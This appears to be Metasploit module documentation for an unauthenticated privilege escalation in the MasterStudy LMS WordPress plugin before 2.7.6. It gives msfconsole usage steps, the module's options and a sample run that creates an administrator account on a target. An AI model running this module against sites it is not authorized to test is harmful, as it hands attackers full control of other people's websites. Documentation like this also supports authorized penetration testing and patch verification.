## Vulnerable Application

MasterStudy LMS, a WordPress plugin,
prior to 2.7.6 is affected by a privilege escalation where an unauthenticated
user is able to create an administrator account for wordpress itself.

[The vulnerable version is available on WordPress' plugin directory](https://downloads.wordpress.org/plugin/masterstudy-lms-learning-management-system.2.7.5.zip).

## Verification Steps

  1. `msfconsole`
  2. `use auxiliary/admin/http/wp_masterstudy_privesc`
  3. `set RHOSTS <rhost>`
  4. `run`

## Options

### USERNAME

Set a `USERNAME` if desirable. Defaults to empty, and random generation.

### PASSWORD

Set a `PASSWORD` if desirable. Defaults to empty, and random generation.

### EMAIL

Set a `EMAIL` if desirable. Defaults to empty, and random generation.

## Scenarios

### MasterStudy 2.7.5 on WordPress 5.7.5

```
[*] Processing masterstudy.rb for ERB directives.
resource (masterstudy.rb)> use auxiliary/admin/http/wp_masterstudy_privesc
resource (masterstudy.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (masterstudy.rb)> set verbose true
verbose => true
resource (masterstudy.rb)> run
[*] Running module against 1.1.1.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt
[*] Found version 2.7.5 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting with username: ujukzntw7 password: TbxjFm0znF email: ashley.thompson@gcvz2cibu.org
[+] Account Created Successfully
[*] Auxiliary module execution completed
```
